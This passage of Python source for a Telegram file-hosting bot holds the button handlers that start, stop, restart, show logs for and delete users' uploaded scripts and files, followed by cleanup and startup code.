            # Get the current domain from environment or use default
            domain = os.environ.get('REPL_SLUG', 'universal-file-host')
            owner = os.environ.get('REPL_OWNER', 'replit-user')
            
            # Try different URL formats
            try:
                replit_url = f"https://{domain}.{owner}.repl.co"
                # Test if we can access our own health endpoint
                test_response = requests.get(f"{replit_url}/health", timeout=2)
                if test_response.status_code != 200:
                    # Fallback to .replit.app domain
                    replit_url = f"https://{domain}-{owner}.replit.app"
            except:
                # Use default replit.app domain
                replit_url = f"https://{domain}-{owner}.replit.app"
            
            file_url = f"{replit_url}/file/{file_hash}"
            
            markup.add(
                types.InlineKeyboardButton("🔗 View File", url=file_url)
            )
        
        # Common buttons for all files
        markup.add(
            types.InlineKeyboardButton("🗑️ Delete", callback_data=f'delete_{user_id}_{file_name}'),
            types.InlineKeyboardButton("🔙 Back", callback_data=f'back_files_{user_id}')
        )
        
        # Show file details
        status = "🟢 Running" if file_type == 'executable' and is_bot_running(user_id, file_name) else "⭕ Stopped" if file_type == 'executable' else "📁 Hosted"
        
        control_text = f"🔧 File Control Panel\n\n"
        control_text += f"📄 File: {file_name}\n"
        control_text += f"📁 Type: {file_type}\n"
        control_text += f"🔄 Status: {status}\n"
        
        if file_type == 'executable' and is_running:
            uptime = get_script_uptime(user_id, file_name)
            if uptime:
                control_text += f"⏱️ Uptime: {uptime}\n"
        
        control_text += f"👤 Owner: {user_id}\n\n"
        control_text += f"🎛️ Choose an action:"
        
        bot.edit_message_text(
            control_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup
        )
        
        bot.answer_callback_query(call.id, f"Control panel for {file_name}")
        
    except Exception as e:
        logger.error(f"Error in file control handler: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('start_'))
def handle_start_file(call):
    """Handle start file button"""
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]
        
        # Check permissions
        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return
            
        # Get file path
        user_folder = get_user_folder(user_id)
        file_path = os.path.join(user_folder, file_name)
        
        if not os.path.exists(file_path):
            bot.answer_callback_query(call.id, "❌ File not found!")
            return
            
        # Check if already running
        if is_bot_running(user_id, file_name):
            bot.answer_callback_query(call.id, "⚠️ Already running!")
            return
            
        # Start the script
        start_time = time.time()
        success, result = execute_script(user_id, file_path)
        execution_time = round(time.time() - start_time, 2)
        
        if success:
            bot.answer_callback_query(call.id, f"🟢 Started in {execution_time}s!")
            # Refresh the control panel
            call.data = f'control_{user_id}_{file_name}'
            handle_file_control(call)
        else:
            bot.answer_callback_query(call.id, f"❌ Start failed: {result}")
            
    except Exception as e:
        logger.error(f"Error starting file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def handle_stop_file(call):
    """Handle stop file button"""
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]
        
        # Check permissions
        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return
            
        # Stop the script
        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)
        
        if script_info and script_info.get('process'):
            try:
                # Calculate runtime before stopping
                runtime = get_script_uptime(user_id, file_name) or "Unknown"
                
                process = script_info['process']
                process.terminate()
                process.wait(timeout=5)
                
                # Remove from database
                remove_running_script(user_id, file_name)
                
                if script_key in bot_scripts:
                    del bot_scripts[script_key]
                
                bot.answer_callback_query(call.id, f"🔴 Stopped! Runtime: {runtime}")
                # Refresh the control panel
                call.data = f'control_{user_id}_{file_name}'
                handle_file_control(call)
            except Exception as e:
                bot.answer_callback_query(call.id, f"❌ Stop failed: {str(e)}")
        else:
            bot.answer_callback_query(call.id, "⚠️ Not running!")
            
    except Exception as e:
        logger.error(f"Error stopping file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('restart_'))
def handle_restart_file(call):
    """Handle restart file button"""
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]
        
        # Check permissions
        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return
            
        # Stop first
        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)
        
        if script_info and script_info.get('process'):
            try:
                process = script_info['process']
                process.terminate()
                process.wait(timeout=5)
                remove_running_script(user_id, file_name)
                if script_key in bot_scripts:
                    del bot_scripts[script_key]
            except:
                pass
        
        # Start again
        user_folder = get_user_folder(user_id)
        file_path = os.path.join(user_folder, file_name)
        
        if os.path.exists(file_path):
            start_time = time.time()
            success, result = execute_script(user_id, file_path)
            execution_time = round(time.time() - start_time, 2)
            
            if success:
                bot.answer_callback_query(call.id, f"🔄 Restarted in {execution_time}s!")
                # Refresh the control panel
                call.data = f'control_{user_id}_{file_name}'
                handle_file_control(call)
            else:
                bot.answer_callback_query(call.id, f"❌ Restart failed: {result}")
        else:
            bot.answer_callback_query(call.id, "❌ File not found!")
            
    except Exception as e:
        logger.error(f"Error restarting file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('logs_'))
def handle_show_logs(call):
    """Handle show logs button"""
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]
        
        # Check permissions
        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return
            
        # Find log file
        script_key = f"{user_id}_{file_name}"
        script_info = bot_scripts.get(script_key)
        
        if script_info and 'log_file_path' in script_info:
            log_file_path = script_info['log_file_path']
            
            if os.path.exists(log_file_path):
                try:
                    with open(log_file_path, 'r') as f:
                        logs = f.read()
                    
                    if logs.strip():
                        # Truncate if too long
                        if len(logs) > 4000:
                            logs = "..." + logs[-4000:]
                        
                        logs_text = f"📜 Execution Logs - {file_name}\n\n```\n{logs}\n```"
                    else:
                        logs_text = f"📜 Execution Logs - {file_name}\n\n🔇 No output yet"
                        
                    bot.send_message(call.message.chat.id, logs_text, parse_mode='Markdown')
                    bot.answer_callback_query(call.id, "📜 Logs sent!")
                    
                except Exception as e:
                    bot.answer_callback_query(call.id, f"❌ Error reading logs: {str(e)}")
            else:
                bot.answer_callback_query(call.id, "❌ Log file not found!")
        else:
            bot.answer_callback_query(call.id, "❌ No logs available!")
            
    except Exception as e:
        logger.error(f"Error showing logs: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_'))
def handle_delete_file(call):
    """Handle delete file button"""
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[1])
        file_name = parts[2]
        
        # Check permissions
        if call.from_user.id != user_id and call.from_user.id not in admin_ids:
            bot.answer_callback_query(call.id, "🚫 Access denied!")
            return
            
        # Stop if running
        script_key = f"{user_id}_{file_name}"
        if script_key in bot_scripts:
            try:
                process = bot_scripts[script_key]['process']
                process.terminate()
                remove_running_script(user_id, file_name)
                del bot_scripts[script_key]
            except:
                pass
        
        # Delete file
        user_folder = get_user_folder(user_id)
        file_path = os.path.join(user_folder, file_name)
        
        if os.path.exists(file_path):
            os.remove(file_path)
        
        # Remove from database
        if user_id in user_files:
            user_files[user_id] = [(fn, ft) for fn, ft in user_files[user_id] if fn != file_name]
        
        try:
            conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
            c = conn.cursor()
            c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', (user_id, file_name))
            c.execute('DELETE FROM running_scripts WHERE user_id = ? AND file_name = ?', (user_id, file_name))
            conn.commit()
            conn.close()
        except Exception as e:
            logger.error(f"Database error deleting file: {e}")
        
        bot.answer_callback_query(call.id, f"🗑️ {file_name} deleted!")
        
        # Go back to files list
        call.data = f'back_files_{user_id}'
        handle_back_to_files(call)
        
    except Exception as e:
        logger.error(f"Error deleting file: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

@bot.callback_query_handler(func=lambda call: call.data.startswith('back_files_'))
def handle_back_to_files(call):
    """Handle back to files list button"""
    try:
        parts = call.data.split('_', 2)
        user_id = int(parts[2])
        
        files = user_files.get(user_id, [])
        
        if not files:
            files_text = "📂 Your Files\n\n🔒 No files uploaded yet.\n\n💡 Upload any file type to begin!"
            markup = None
        else:
            files_text = "🔒 Your Files:\n\n📁 Click on any file to manage it:\n\n"
            markup = types.InlineKeyboardMarkup(row_width=1)
            
            for i, (file_name, file_type) in enumerate(files, 1):
                if file_type == 'executable':
                    is_running = is_bot_running(user_id, file_name)
                    status = "🟢 Running" if is_running else "⭕ Stopped"
                    icon = "🚀"
                    
                    # Add uptime info if running
                    if is_running:
                        uptime = get_script_uptime(user_id, file_name)
                        if uptime:
                            status += f" (Uptime: {uptime})"
                    
                    files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n\n"
                else:
                    status = "📁 Hosted"
                    icon = "📄"
                    file_hash = hashlib.md5(f"{user_id}_{file_name}".encode()).hexdigest()
                    
                    # Get the current domain from environment or use default
                    domain = os.environ.get('REPL_SLUG', 'universal-file-host')
                    owner = os.environ.get('REPL_OWNER', 'replit-user')
                    
                    # Try different URL formats
                    try:
                        replit_url = f"https://{domain}.{owner}.repl.co"
                        # Test if we can access our own health endpoint
                        test_response = requests.get(f"{replit_url}/health", timeout=2)
                        if test_response.status_code != 200:
                            # Fallback to .replit.app domain
                            replit_url = f"https://{domain}-{owner}.replit.app"
                    except:
                        # Use default replit.app domain
                        replit_url = f"https://{domain}-{owner}.replit.app"
                    
                    file_url = f"{replit_url}/file/{file_hash}"
                    files_text += f"{i}. {file_name} ({file_type})\n   Status: {status}\n   🔗 Access: {file_url}\n\n"
                
                markup.add(types.InlineKeyboardButton(
                    f"{icon} {file_name} - {status}", 
                    callback_data=f'control_{user_id}_{file_name}'
                ))
            
            files_text += "⚙️ Management Options:\n• 🟢 Start/🔴 Stop executable files\n• 🗑️ Delete files\n• 📜 View execution logs\n• 🔄 Restart running files"
        
        bot.edit_message_text(
            files_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup
        )
        
        bot.answer_callback_query(call.id, "📂 Files list updated!")
        
    except Exception as e:
        logger.error(f"Error going back to files: {e}")
        bot.answer_callback_query(call.id, "❌ Error occurred!")

# --- Catch all handler for unsupported messages ---
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    # Check if user is in broadcast mode
    if message.from_user.id in broadcast_mode and broadcast_mode[message.from_user.id]:
        handle_broadcast_message(message)
        return
        
    safe_reply_to(message, "🔒 Use the menu buttons or send /start for help.")

# --- Initialize and Start Bot ---
def cleanup_on_exit():
    """Cleanup function called on exit"""
    logger.info("Performing cleanup on exit...")
    
    # Stop all running scripts
    for script_key, script_info in bot_scripts.items():
        try:
            process = script_info.get('process')
            if process and process.poll() is None:
                process.terminate()
                logger.info(f"Terminated script: {script_key}")
        except Exception as e:
            logger.error(f"Error terminating script {script_key}: {e}")
    
    # Stop all cloned bots
    for user_id, clone_info in user_clones.items():
        try:
            process = clone_info.get('process')
            if process and process.poll() is None:
                process.terminate()
                logger.info(f"Terminated clone for user: {user_id}")
        except Exception as e:
            logger.error(f"Error terminating clone for user {user_id}: {e}")

if __name__ == "__main__":
    # Register cleanup function
    atexit.register(cleanup_on_exit)
    
    # Initialize database and load data
    init_db()
    load_data()
    
    # Start Flask keep-alive server
    keep_alive()
    
    logger.info("🚀 Universal File Host Bot starting...")
    logger.info(f"👑 Owner ID: {OWNER_ID}")
    logger.info(f"👤 Admin ID: {ADMIN_ID}")
    logger.info(f"📁 Upload directory: {UPLOAD_BOTS_DIR}")
    
    try:
        # Test bot connection first
        bot_info = bot.get_me()
        logger.info(f"Bot connected successfully: @{bot_info.username}")
        print(f"🤖 Bot connected successfully: @{bot_info.username}")
        print(f"🚀 Bot is now running with FULLY WORKING ADVANCED CLONE FEATURE!")
        print(f"📢 Broadcast feature: Working perfectly")
        print(f"🤖 Clone feature: COMPLETELY FIXED - Cloned bots will have ALL features!")
        print(f"💡 Users can now clone the bot using /settoken command")
        print(f"⏰ Auto-restart feature: All scripts will restart automatically on bot reboot")
        print(f"📊 Enhanced admin panel: Now with user management and subscription system")
        
        # Start polling with error handling
        bot.infinity_polling(timeout=10, long_polling_timeout=5, none_stop=True, interval=0)
    except Exception as e:
        logger.error(f"Bot error: {e}")
        print(f"❌ Bot connection failed: {e}")
        sys.exit(1)
